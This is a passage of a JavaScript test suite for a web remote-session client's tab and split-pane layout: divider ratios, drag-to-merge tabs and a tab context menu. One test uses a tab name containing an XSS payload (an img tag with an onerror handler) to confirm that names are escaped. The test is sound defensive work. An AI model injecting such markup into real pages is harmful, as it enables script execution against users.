// Splitting a pane: the new split takes the share that pane had in its
// parent split and divides it 50/50. Closing (or cancelling the login
// of) a pane: the remaining sibling takes the split's share. h and v,
// nested, and the saved layout keeps the ratios across a reload.
//
// Hooks / assumptions: as above, a split's proportion is its two
// children's flex-grow ('' = 1). paneBoxes() lays the tree out from
// those values (handles ignored, as their 3 px are) to fractions of the
// tab: "on screen" here is that layout; 1 px = 1/720 of the width,
// 1/432 of the height. The tester's browser scenario measures real pixels.
// =====================================================================
function paneBoxes(win, tid) {
  const root = tabRootById(win, tid);
  const top = root && layoutKids(root)[0];
  const out = {};
  const walk = (el, x0, y0, x1, y1) => {
    if (!el) return;
    if (el.classList.contains('pane')) {
      const p = win.panes[el.getAttribute('data-pane')];
      out[p ? p.host : el.getAttribute('data-pane')] = {x0, y0, x1, y1};
      return;
    }
    const k = layoutKids(el);
    if (k.length < 2) { walk(k[0], x0, y0, x1, y1); return; }
    const r = flexGrow(k[0]) / (flexGrow(k[0]) + flexGrow(k[1]));
    if (el.classList.contains('split-h')) {
      const m = x0 + (x1 - x0) * r; walk(k[0], x0, y0, m, y1); walk(k[1], m, y0, x1, y1);
    } else {
      const m = y0 + (y1 - y0) * r; walk(k[0], x0, y0, x1, m); walk(k[1], x0, m, x1, y1);
    }
  };
  walk(top, 0, 0, 1, 1);
  return out;
}
const PX_W = 1 / 720 + 1e-9, PX_H = 1 / 432 + 1e-9;
const fmtBox = b => b ? [b.x0, b.x1, b.y0, b.y1].map(v => Math.round(v * 1000) / 10).join('/') : 'none';
// Hosts whose box moved by more than a pixel between two paneBoxes() results.
function movedBoxes(before, after, hosts) {
  const out = [];
  hosts.forEach(h => {
    const a = before[h], b = after[h];
    if (!a || !b) { out.push(h + ' missing'); return; }
    if (Math.abs(a.x0 - b.x0) > PX_W || Math.abs(a.x1 - b.x1) > PX_W || Math.abs(a.y0 - b.y0) > PX_H || Math.abs(a.y1 - b.y1) > PX_H)
      out.push(h + ' ' + fmtBox(a) + ' -> ' + fmtBox(b) + ' (% x0/x1/y0/y1)');
  });
  return out;
}
// Box b equals the expected fractions (each +-1 px).
function boxIs(b, x0, x1, y0, y1) {
  return !!b && Math.abs(b.x0 - x0) <= PX_W && Math.abs(b.x1 - x1) <= PX_W && Math.abs(b.y0 - y0) <= PX_H && Math.abs(b.y1 - y1) <= PX_H;
}

test('divider share: splitting a pane keeps its share - A | B at 70/30, B split (h or v): A stays 70%, B and the new pane halve B\'s 30%', async () => {
  for (const dir of ['h', 'v']) {
    const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
    const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
    if (!needTabs(win) || !a || !b) { ok(false, 'setup'); cleanup(env); return; }
    const tid = tabOfPane(a);
    dragSplit(win, wrapOf(a), 0.7);
    let bx = paneBoxes(win, tid);
    ok(boxIs(bx['a.host'], 0, 0.7, 0, 1), dir + ': setup: a at 70% (' + fmtBox(bx['a.host']) + ')');
    const c = await tSplit(win, b, dir, 'c.host');
    if (!c) { ok(false, 'setup: c'); cleanup(env); return; }
    bx = paneBoxes(win, tid);
    ok(boxIs(bx['a.host'], 0, 0.7, 0, 1), dir + ': b split: a still 0..70% of the width; a ' + fmtBox(bx['a.host']) +
       ' (flex a ' + show(a.el.style.flex) + ', new split ' + show(wrapOf(c).style.flex) + ')');
    const halves = dir === 'h'
      ? boxIs(bx['b.host'], 0.7, 0.85, 0, 1) && boxIs(bx['c.host'], 0.85, 1, 0, 1)
      : boxIs(bx['b.host'], 0.7, 1, 0, 0.5) && boxIs(bx['c.host'], 0.7, 1, 0.5, 1);
    ok(halves, dir + ': b and c halve b\'s old 30%; b ' + fmtBox(bx['b.host']) + ', c ' + fmtBox(bx['c.host']) +
       ' (flex b ' + show(b.el.style.flex) + ', c ' + show(c.el.style.flex) + ')');
    // One level deeper: c (in a 50/50 split inside b's share) split again, the other way.
    const d = await tSplit(win, c, dir === 'h' ? 'v' : 'h', 'd.host');
    const bx2 = paneBoxes(win, tid);
    const mv = movedBoxes(bx, bx2, ['a.host', 'b.host']);
    ok(!!d && mv.length === 0, dir + ': c split again: a and b do not move; moved: ' + show(mv));
    const cd = bx2['c.host'], dd = bx2['d.host'], old = bx['c.host'];
    const covers = cd && dd && old && Math.abs(Math.min(cd.x0, dd.x0) - old.x0) <= PX_W && Math.abs(Math.max(cd.x1, dd.x1) - old.x1) <= PX_W &&
      Math.abs(Math.min(cd.y0, dd.y0) - old.y0) <= PX_H && Math.abs(Math.max(cd.y1, dd.y1) - old.y1) <= PX_H &&
      Math.abs((cd.x1 - cd.x0) * (cd.y1 - cd.y0) - (dd.x1 - dd.x0) * (dd.y1 - dd.y0)) < 0.004;
    ok(!!covers, dir + ': c and d halve c\'s old box ' + fmtBox(old) + '; c ' + fmtBox(cd) + ', d ' + fmtBox(dd));
    cleanup(env);
  }
});

test('divider share: closing a pane of a nested split leaves every other divider where it was (h, v, nested; a split login cancelled in flight moves nothing)', async () => {
  const env = await mkTabEnv(TAB_PLAN([{action: 'connect', match: b => b.host === 'z.host',
    response: {session_id: 'sid-z', alive: true}, delay: 300, once: true}]), null, S4); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !a || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tid = tabOfPane(a);
  const c = await tSplit(win, b, 'v', 'c.host');
  const d = c && await tSplit(win, a, 'v', 'd.host');
  if (!d) { ok(false, 'setup'); cleanup(env); return; }
  // (a over d) | (b over c), outer 70/30, a over d 40/60, b over c 25/75.
  dragSplit(win, wrapOf(a).parentElement, 0.7);
  dragSplit(win, wrapOf(a), 0.4);
  dragSplit(win, wrapOf(b), 0.25);
  let bx = paneBoxes(win, tid);
  ok(boxIs(bx['a.host'], 0, 0.7, 0, 0.4) && boxIs(bx['b.host'], 0.7, 1, 0, 0.25), 'setup: (a over d 40/60) | (b over c 25/75) at 70/30; ' +
     show(Object.keys(bx).map(h => h + ' ' + fmtBox(bx[h]))));
  const fails = [];
  const check = (what, keep) => {
    const now = paneBoxes(win, tid);
    const mv = movedBoxes(bx, now, keep);
    if (mv.length) fails.push(what + ': ' + mv.join('; '));
    bx = now;
  };
  // A split started from c, Connect pressed, cancelled while it is in flight: nothing moves.
  win.splitPane(c.id, 'h');
  await until(() => !hidden($(win, 'ov')), 1000);
  $(win, 'iH').value = 'z.host'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(50);
  win.cancelConnect();
  await until(() => hidden($(win, 'ov')), 1000);
  await sleep(30);
  check('a split of c, login cancelled', ['a.host', 'b.host', 'c.host', 'd.host']);
  // c closed: b takes the whole right column; a and d stay.
  win.closePane(c.id); await sleep(30);
  const nb = paneBoxes(win, tid)['b.host'];
  if (!boxIs(nb, 0.7, 1, 0, 1)) fails.push('c closed: b should fill 70..100% x 0..100%, is ' + fmtBox(nb));
  check('c closed', ['a.host', 'd.host']);
  // a closed: d takes the left column; b stays.
  win.closePane(a.id); await sleep(30);
  const nd = paneBoxes(win, tid)['d.host'];
  if (!boxIs(nd, 0, 0.7, 0, 1)) fails.push('a closed: d should fill 0..70% x 0..100%, is ' + fmtBox(nd));
  check('a closed', ['b.host']);
  ok(fails.length === 0, 'every close left the other dividers where they were; wrong: ' + show(fails));
  cleanup(env);
});

test('divider share: a deeper close keeps outer dividers, and the saved layout keeps every ratio across a reload', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const [a, b] = await splitTabEnv(win, ['a.host', 'b.host']);
  if (!needTabs(win) || !a || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tid = tabOfPane(a);
  // a | (b over (c | e)): outer 30/70, b over (c|e) 60/40, c | e 20/80.
  const c = await tSplit(win, b, 'v', 'c.host');
  const e = c && await tSplit(win, c, 'h', 'e.host');
  if (!e) { ok(false, 'setup'); cleanup(env); return; }
  dragSplit(win, wrapOf(a), 0.3);
  dragSplit(win, wrapOf(b), 0.6);
  dragSplit(win, wrapOf(c), 0.2);
  const before = paneBoxes(win, tid);
  ok(boxIs(before['a.host'], 0, 0.3, 0, 1) && boxIs(before['b.host'], 0.3, 1, 0, 0.6) && boxIs(before['c.host'], 0.3, 0.44, 0.6, 1),
     'setup: a | (b over (c | e)) at 30/70, 60/40, 20/80; ' + show(Object.keys(before).map(h => h + ' ' + fmtBox(before[h]))));
  // Reload: every box comes back.
  const snap = snapshotStorage(win);
  cleanup(env);
  const env2 = await mkTabEnv(TAB_PLAN(), snap, S4); const w2 = env2.win;
  await until(() => paneList(w2).filter(p => p.sid).length === 4, 2000);
  await sleep(50);
  const P = h => paneList(w2).find(p => p.host === h);
  const tid2 = tabOfPane(P('a.host'));
  const after = paneBoxes(w2, tid2);
  const mv = movedBoxes(before, after, ['a.host', 'b.host', 'c.host', 'e.host']);
  ok(mv.length === 0, 'after a reload every pane is where it was; moved: ' + show(mv));
  // Close c (deepest): e takes c | e's box; a and b stay.
  w2.closePane(P('c.host').id); await sleep(30);
  const x = paneBoxes(w2, tid2);
  ok(movedBoxes(after, x, ['a.host', 'b.host']).length === 0 && boxIs(x['e.host'], 0.3, 1, 0.6, 1),
     'c closed: a and b stay, e fills c | e\'s box (30..100% x 60..100%); moved ' + show(movedBoxes(after, x, ['a.host', 'b.host'])) +
     ', e ' + fmtBox(x['e.host']));
  // A split after the reload keeps the share too, and that is saved.
  const f = await tSplit(w2, P('a.host'), 'v', 'f.host');
  const y = paneBoxes(w2, tid2);
  ok(!!f && boxIs(y['a.host'], 0, 0.3, 0, 0.5) && boxIs(y['f.host'], 0, 0.3, 0.5, 1) && movedBoxes(x, y, ['b.host', 'e.host']).length === 0,
     'a split under after the reload: a and f halve a\'s 30% column, b and e stay; a ' + fmtBox(y['a.host']) + ', f ' + fmtBox(y['f.host']));
  const snap2 = snapshotStorage(w2);
  cleanup(env2);
  const env3 = await mkTabEnv(TAB_PLAN(), snap2, S4); const w3 = env3.win;
  await until(() => paneList(w3).filter(p => p.sid).length === 4, 2000);
  await sleep(50);
  const z = paneBoxes(w3, tabOfPane(paneList(w3).find(p => p.host === 'a.host')));
  const mv3 = movedBoxes(y, z, ['a.host', 'b.host', 'e.host', 'f.host']);
  ok(mv3.length === 0, 'and that layout comes back the same after a second reload; moved: ' + show(mv3));
  cleanup(env3);
});

// =====================================================================
// Feature 3a: spring-loaded tabs
// =====================================================================
test('spring: the tab on screen, dragged and held over another tab, brings that tab forward; dropped on a pane edge it merges there', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b);
  ok(tabId(activeTab(win)) === tB, 'setup: B (the tab to put back) is in front');
  await settled(win, b);
  const mark = env.log.length;
  const spy = sessionSpy(win, [a, b]);
  const m = grabTab(win, tabById(win, tB));
  const tAel = tabById(win, tA);
  const [x, y] = centre(tAel);
  m.move(tAel.querySelector('.tab-label') || tAel, x, y);
  await sleep(250);
  ok(tabId(activeTab(win)) === tB, 'after 250 ms over A, B is still in front');
  const came = await until(() => tabId(activeTab(win)) === tA, 1500);
  ok(came, 'held over A, A comes to the front (within ~0.5 s)');
  ok(!env.lay.hidden(a.el), 'a is on screen');
  const up = overEdge(m, a, 'left');
  ok(zoneOf(a) === 'left', 'the drag goes on: the left half of a is highlighted before release; got ' + show(zoneOf(a)));
  up();
  await until(() => tabEls(win).length === 1, 500);
  ok(shape(win, tA) === '(h b.host a.host)', 'B landed left of a in A; got ' + show(shapesNow(win)));
  ok(!tabById(win, tB) && !tabRootById(win, tB), 'B\'s tab is gone');
  ok(tabId(activeTab(win)) === tA, 'A is in front');
  ok(spy.length === 0 && sessionCalls(env, mark).length === 0, 'no reconnect, no restart; got ' + show(spy.concat(sessionCalls(env, mark))));
  ok(anyZone(win) === 0 && noDragLeft(win), 'no zone, no drag state left');
  const saved = savedShapes(win);
  ok(!!saved && show(saved.tabs) === show(['(h b.host a.host)']), 'saved at once; got ' + show(saved));
  await sleep(250);
  ok(env.log.slice(mark).filter(e => e.action === 'resize' && degenerate(e)).length === 0, 'no degenerate resize');
  cleanup(env);
});

test('spring: a pass over a tab switches nothing; a release before the rest switches nothing later; released outside, the first tab comes back', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b);
  const tAel = tabById(win, tA);
  const ev = everActive(win, tAel);
  // A pass: over A for one move, then on along the strip.
  let m = grabTab(win, tabById(win, tB));
  const [x, y] = centre(tAel);
  m.move(tAel.querySelector('.tab-label') || tAel, x, y);
  await sleep(60);
  m.move($(win, 'tabs'), x + 1, y);
  await sleep(900);
  ok(!ev.hit, 'a pass over A (60 ms) never brought A forward');
  m.up($(win, 'tabs'), x + 1, y);
  ok(tabId(activeTab(win)) === tB && tabEls(win).length === 2, 'dropped on the strip: B in front, both tabs there');
  // Released on A at once: no switch later from a leftover timer.
  m = grabTab(win, tabById(win, tB));
  m.move(tAel.querySelector('.tab-label') || tAel, x, y);
  m.up(tAel.querySelector('.tab-label') || tAel, x, y);
  await sleep(900);
  ok(!ev.hit && tabId(activeTab(win)) === tB, 'released over A before the rest: A never shown afterwards');
  // Rest, then out of the window and released there.
  await sleep(50);
  const shapes0 = show(shapesNow(win)), saved0 = show(savedShapes(win));
  m = grabTab(win, tabById(win, tB));
  const came = await restOver(win, m, tAel, () => tabId(activeTab(win)) === tA);
  ok(came, 'setup: held over A, A came forward');
  outside(win, m);
  await until(() => tabId(activeTab(win)) === tB, 500);
  ok(tabId(activeTab(win)) === tB, 'released outside the window: B, in front when the drag began, is back');
  ok(show(shapesNow(win)) === shapes0, 'nothing moved, strip order as before; got ' + show(shapesNow(win)) + ' was ' + shapes0);
  ok(show(savedShapes(win)) === saved0, 'the saved layout and front tab unchanged; got ' + show(savedShapes(win)));
  ok(anyZone(win) === 0 && noDragLeft(win), 'no zone, no drag state');
  // Rest, then the button goes up outside the window (next move has no button).
  m = grabTab(win, tabById(win, tB));
  ok(await restOver(win, m, tAel, () => tabId(activeTab(win)) === tA), 'setup: A forward again');
  outside(win, m, true);
  await until(() => tabId(activeTab(win)) === tB, 500);
  ok(tabId(activeTab(win)) === tB && show(shapesNow(win)) === shapes0, 'button released outside: B back, nothing moved');
  ok(show(savedShapes(win)) === saved0, 'saved layout unchanged');
  ev.stop();
  cleanup(env);
});

test('spring: a pointer trembling by a couple of pixels still counts as resting', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b);
  const m = grabTab(win, tabById(win, tB));
  const came = await restOver(win, m, tabById(win, tA), () => tabId(activeTab(win)) === tA, 2000, true);
  ok(came, 'moving +-2 px every 100 ms over A, A still comes forward within 2 s');
  outside(win, m);
  await until(() => tabId(activeTab(win)) === tB, 500);
  ok(tabId(activeTab(win)) === tB, 'released outside: B back');
  cleanup(env);
});

test('spring: from one held tab to another; the drop goes into the tab shown last', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const [a, b, c] = await threeTabs(win);
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const [tA, tB, tC] = [tabOfPane(a), tabOfPane(b), tabOfPane(c)];
  clickTab(win, tabById(win, tB));
  await until(() => tabId(activeTab(win)) === tB, 500);
  const m = grabTab(win, tabById(win, tB));
  ok(await restOver(win, m, tabById(win, tA), () => tabId(activeTab(win)) === tA), 'held over A: A forward');
  ok(await restOver(win, m, tabById(win, tC), () => tabId(activeTab(win)) === tC), 'then held over C: C forward');
  const up = overEdge(m, c, 'right');
  ok(zoneOf(c) === 'right', 'c\'s right half highlighted; got ' + show(zoneOf(c)));
  up();
  await until(() => tabEls(win).length === 2, 500);
  ok(shape(win, tC) === '(h c.host b.host)' && shape(win, tA) === 'a.host', 'B went right of c; A untouched; got ' + show(shapesNow(win)));
  ok(tabId(activeTab(win)) === tC, 'C in front');
  cleanup(env);
});

test('spring: a pane dragged by its name and held over another tab brings it forward; dropped on a pane edge it goes there', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a1 = await tConnect(win, 'a1.host');
  const b1 = a1 && await tNewTab(win, 'b1.host');
  const b2 = b1 && await tSplit(win, b1, 'h', 'b2.host');
  if (!needTabs(win) || !b2) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a1), tB = tabOfPane(b1);
  await settled(win, b2);
  const mark = env.log.length;
  const spy = sessionSpy(win, [a1, b1, b2]);
  let m = grabPane(win, b2);
  const tAel = tabById(win, tA);
  const [x, y] = centre(tAel);
  m.move(tAel.querySelector('.tab-label') || tAel, x, y);
  await sleep(250);
  ok(tabId(activeTab(win)) === tB, 'after 250 ms over A, B is still in front');
  ok(await until(() => tabId(activeTab(win)) === tA, 1500), 'held over A, A comes forward');
  const up = overEdge(m, a1, 'bottom');
  ok(zoneOf(a1) === 'bottom', 'the bottom half of a1 is highlighted before release; got ' + show(zoneOf(a1)));
  up();
  await until(() => panesOfTab(win, tA).length === 2, 500);
  ok(shape(win, tA) === '(v a1.host b2.host)' && shape(win, tB) === 'b1.host', 'b2 under a1 in A, b1 alone in B; got ' + show(shapesNow(win)));
  ok(tabId(activeTab(win)) === tA && win.activeId === b2.id, 'A in front, b2 active');
  ok(spy.length === 0 && sessionCalls(env, mark).length === 0, 'no reconnect, no restart; got ' + show(spy.concat(sessionCalls(env, mark))));
  ok(anyZone(win) === 0 && noDragLeft(win), 'no zone, no drag state left');
  ok(show(savedShapes(win).tabs) === show(shapesNow(win)), 'saved as shown; got ' + show(savedShapes(win)));
  // Back out: a1 (now with a bar) held over B, released outside: nothing.
  const shapes0 = show(shapesNow(win)), saved0 = show(savedShapes(win));
  m = grabPane(win, a1);
  ok(await restOver(win, m, tabById(win, tB), () => tabId(activeTab(win)) === tB), 'a1 held over B: B forward');
  outside(win, m);
  await until(() => tabId(activeTab(win)) === tA, 500);
  ok(tabId(activeTab(win)) === tA && show(shapesNow(win)) === shapes0 && show(savedShapes(win)) === saved0,
     'released outside: A back in front, nothing moved, nothing saved; got ' + show(shapesNow(win)));
  ok(noDragLeft(win) && anyZone(win) === 0, 'no drag state');
  cleanup(env);
});

test('spring (break): the dragged tab closes while another is held open; the release merges nothing and leaves nothing behind', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a);
  const m = grabTab(win, tabById(win, tabOfPane(b)));
  ok(await restOver(win, m, tabById(win, tA), () => tabId(activeTab(win)) === tA), 'setup: A forward');
  win.closePane(b.id);
  await until(() => tabEls(win).length === 1, 500);
  const up = overEdge(m, a, 'left');
  up();
  await sleep(50);
  ok(tabEls(win).length === 1 && shape(win, tA) === 'a.host' && tabId(activeTab(win)) === tA, 'A alone, in front; got ' + show(shapesNow(win)));
  ok(anyZone(win) === 0 && noDragLeft(win), 'no zone, no drag state');
  await sleep(700);
  ok(tabId(activeTab(win)) === tA && tabEls(win).length === 1, 'nothing switches later');
  cleanup(env);
});

// =====================================================================
// Feature 3b: the tab menu and a pane's "Move to tab"
// =====================================================================
test('tab menu: a right-click opens Rename / Move into tab / Close instead of the browser\'s menu; Escape or a click outside closes it', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabElOfPane(win, a), tB = tabElOfPane(win, b);
  const ev = tabMenu(win, tA);
  ok(ev.defaultPrevented, 'the browser\'s own context menu is suppressed');
  ok(openMenus(env).length === 1, 'one menu ([role=menu]) is open; got ' + openMenus(env).length);
  ['Rename', 'Move into tab', 'Close'].forEach(n => ok(!!findItem(env, new RegExp('^' + n, 'i')),
    'it has "' + n + '"; items: ' + show(itemsShown(env).map(itemText))));
  ok(activeTab(win) === tB, 'a right-click does not change the tab in front');
  keyAt(win, 'Escape', 'Escape');
  ok(openMenus(env).length === 0, 'Escape closes it');
  ok(hidden($(win, 'ov')) && tabEls(win).length === 2 && !renameField(tA), 'and does nothing else');
  tabMenu(win, tA);
  const out = b.el.querySelector('.pane-term') || b.el;
  fire(win, out, 'mousedown', 0); fire(win, out, 'mouseup', 0); fire(win, out, 'click', 0);
  ok(openMenus(env).length === 0, 'a click outside closes it');
  ok(tabEls(win).length === 2 && !renameField(tA) && shape(win, tabId(tB)) === 'b.host', 'and chooses nothing');
  tabMenu(win, tB);
  tabMenu(win, tA);
  ok(openMenus(env).length === 1, 'right-clicking another tab leaves one menu open, not two; got ' + openMenus(env).length);
  keyAt(win, 'Escape', 'Escape');
  cleanup(env);
});

test('tab menu: "Move into tab" lists the other tabs by title and puts this tab\'s whole layout beside the chosen tab\'s active pane', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const [a1, a2] = await (async () => { const x = await tConnect(win, 'a1.host'); return [x, x && await tSplit(win, x, 'v', 'a2.host')]; })();
  const b1 = a2 && await tNewTab(win, 'b1.host');
  const b2 = b1 && await tSplit(win, b1, 'h', 'b2.host');
  const c = b2 && await tNewTab(win, 'c.host');
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a1), tB = tabOfPane(b1), tC = tabOfPane(c);
  clickTab(win, tabById(win, tB));
  await until(() => tabId(activeTab(win)) === tB, 500);
  const nameA = tabLabel(tabById(win, tA)), nameB = tabLabel(tabById(win, tB)), nameC = tabLabel(tabById(win, tC));
  const mark = env.log.length;
  const spy = sessionSpy(win, [a1, a2, b1, b2, c]);
  tabMenu(win, tabById(win, tB));
  const mv = findItem(env, /^Move into tab/i);
  ok(!!mv, 'B\'s menu has "Move into tab"');
  if (mv) press(win, mv);
  await until(() => targetItems(env).length >= 2, 300);
  const names = targetItems(env).map(itemText);
  ok(names.some(n => n.indexOf(nameA) >= 0) && names.some(n => n.indexOf(nameC) >= 0), 'the list names A and C (' + show([nameA, nameC]) + '); got ' + show(names));
  ok(!names.some(n => n.indexOf(nameB) >= 0), 'but not B itself; got ' + show(names));
  const err = await chooseTarget(env, null, nameA);
  ok(!err, 'chose A: ' + (err || 'ok'));
  await until(() => tabEls(win).length === 2, 500);
  ok(shape(win, tA) === '(v a1.host (h a2.host (h b1.host b2.host)))', 'B\'s layout right of a2 (A\'s active pane), kept as it was; got ' + shape(win, tA));
  ok(!tabById(win, tB) && !tabRootById(win, tB), 'B\'s tab is gone');
  ok(tabId(activeTab(win)) === tA, 'A is shown');
  ok(openMenus(env).length === 0, 'the menu closed');
  ok(spy.length === 0 && sessionCalls(env, mark).length === 0, 'no reconnect, no restart; got ' + show(spy.concat(sessionCalls(env, mark))));
  ok(show(savedShapes(win).tabs) === show(shapesNow(win)), 'saved at once; got ' + show(savedShapes(win)));
  cleanup(env);
});

test('tab menu: Rename edits that tab (also a background one); Close closes only that tab; with one tab nothing to move into', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabElOfPane(win, a), tB = tabElOfPane(win, b);
  tabMenu(win, tA);
  const rn = findItem(env, /^Rename/i);
  ok(!!rn, 'A\'s menu has Rename');
  if (rn) press(win, rn);
  await until(() => !!renameField(tA), 300);
  const inp = renameField(tA);
  ok(!!inp && !renameField(tB), 'the field opens in A (not in B, the tab in front)');
  ok(!!inp && win.document.activeElement === inp, 'with the focus');
  ok(openMenus(env).length === 0, 'the menu closed');
  if (inp) { typeName(win, inp, 'from menu'); keyOn(win, inp, 'Enter', 'Enter'); }
  await until(() => !renameField(tA), 300);
  ok(tabLabel(tA) === 'from menu', 'A renamed; got ' + show(tabLabel(tA)));
  tabMenu(win, tA);
  const cl = findItem(env, /^Close/i);
  if (cl) press(win, cl);
  await until(() => tabEls(win).length === 1, 500);
  ok(tabEls(win).length === 1 && !win.panes[a.id] && activeTab(win) === tB, 'Close closed A and its pane; B stays in front');
  ok(openMenus(env).length === 0, 'the menu closed');
  const shapes0 = show(shapesNow(win));
  tabMenu(win, tB);
  const mv = findItem(env, /^Move into tab/i);
  if (mv) press(win, mv);
  await sleep(50);
  ok(targetItems(env).length === 0, 'with one tab the list is empty or "Move into tab" is disabled; got ' + show(targetItems(env).map(itemText)));
  keyAt(win, 'Escape', 'Escape'); keyAt(win, 'Escape', 'Escape');
  ok(show(shapesNow(win)) === shapes0 && openMenus(env).length === 0, 'nothing changed');
  cleanup(env);
});

test('tab menu: works from the keyboard - arrows move, Enter chooses, ArrowRight opens the list of tabs', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabElOfPane(win, a), tB = tabElOfPane(win, b);
  const ae = () => win.document.activeElement;
  tabMenu(win, tA);
  if (!isItem(ae())) keyAt(win, 'ArrowDown', 'ArrowDown');
  ok(isItem(ae()), 'a menu item has the keyboard focus (on open or after ArrowDown); focus on ' + (ae() && ae().tagName));
  const first = ae();
  keyAt(win, 'ArrowDown', 'ArrowDown');
  ok(isItem(ae()) && ae() !== first, 'ArrowDown moves to another item');
  keyAt(win, 'ArrowUp', 'ArrowUp');
  ok(ae() === first, 'ArrowUp moves back');
  for (let i = 0; i < 6 && isItem(ae()) && !/^Rename/i.test(itemText(ae())); i++) keyAt(win, 'ArrowDown', 'ArrowDown');
  ok(isItem(ae()) && /^Rename/i.test(itemText(ae())), 'Rename reached with the arrows');
  keyAt(win, 'Enter', 'Enter');
  await until(() => !!renameField(tA), 300);
  ok(!!renameField(tA) && openMenus(env).length === 0, 'Enter on Rename opens A\'s field and closes the menu');
  if (renameField(tA)) keyOn(win, renameField(tA), 'Escape', 'Escape');
  tabMenu(win, tA);
  if (!isItem(ae())) keyAt(win, 'ArrowDown', 'ArrowDown');
  for (let i = 0; i < 6 && isItem(ae()) && !/^Move into tab/i.test(itemText(ae())); i++) keyAt(win, 'ArrowDown', 'ArrowDown');
  ok(isItem(ae()) && /^Move into tab/i.test(itemText(ae())), '"Move into tab" reached with the arrows');
  const parent = ae();
  keyAt(win, 'ArrowRight', 'ArrowRight');
  if (ae() === parent) keyAt(win, 'Enter', 'Enter');
  ok(isItem(ae()) && itemText(ae()).indexOf(tabLabel(tB)) >= 0, 'ArrowRight (or Enter) goes into the list, on B ' + show(tabLabel(tB)) +
     '; focus on ' + show(ae() && itemText(ae())));
  keyAt(win, 'Enter', 'Enter');
  await until(() => tabEls(win).length === 1, 500);
  ok(shape(win, tabId(tB)) === '(h b.host a.host)' && tabEls(win).length === 1, 'Enter merged A into B, right of b; got ' + show(shapesNow(win)));
  ok(openMenus(env).length === 0, 'and the menu closed');
  cleanup(env);
});

test('tab menu (break): names are text in the list; a tab that goes away while the list is open is not merged into', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const [a, b, c] = await threeTabs(win);
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabElOfPane(win, a), tB = tabElOfPane(win, b), tC = tabElOfPane(win, c);
  const evil = '<img src=x onerror="window.__xss2=1">';
  await renameTo(env, tA, evil, 'enter');
  tabMenu(win, tC);
  const mv = findItem(env, /^Move into tab/i);
  if (mv) press(win, mv);
  await until(() => targetItems(env).length >= 2, 300);
  const items = targetItems(env);
  ok(items.some(e => itemText(e).indexOf(evil) >= 0), 'A is listed under its name, literally; got ' + show(items.map(itemText)));
  ok(!openMenus(env).some(m => m.querySelector('img')) && !win.__xss2, 'no element or script made from the name');
  const itB = items.find(e => itemText(e).indexOf(tabLabel(tB)) >= 0);
  win.closeTab(tabId(tB));
  await until(() => tabEls(win).length === 2, 500);
  const shapes0 = show(shapesNow(win));
  if (itB && itB.isConnected) press(win, itB);
  await sleep(50);
  ok(show(shapesNow(win)) === shapes0 && tabEls(win).length === 2, 'choosing the closed tab merges nothing; got ' + show(shapesNow(win)));
  ok(!!win.panes[c.id] && tabOfPane(c) === tabId(tC), 'C and its pane are untouched');
  keyAt(win, 'Escape', 'Escape'); keyAt(win, 'Escape', 'Escape');
  cleanup(env);
});

// Measured in Chromium (e2e tabbreak): a tab's menu open, the tab closed
// by Alt+W - the menu stayed on screen with Rename / Close tab for a tab
// that no longer exists. Its items did nothing (each re-checks), but a
// menu about nothing is left floating until the next click elsewhere.
test('tab menu (break): the menu of a tab that closes by another path goes with it', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const [a, b, c] = await threeTabs(win);
  if (!needTabs(win) || !c) { ok(false, 'setup'); cleanup(env); return; }
  const tC = tabElOfPane(win, c);
  tabMenu(win, tC);
  ok(openMenus(env).length >= 1, 'harness: C\'s menu is open');
  win.closeTab(tabId(tC));
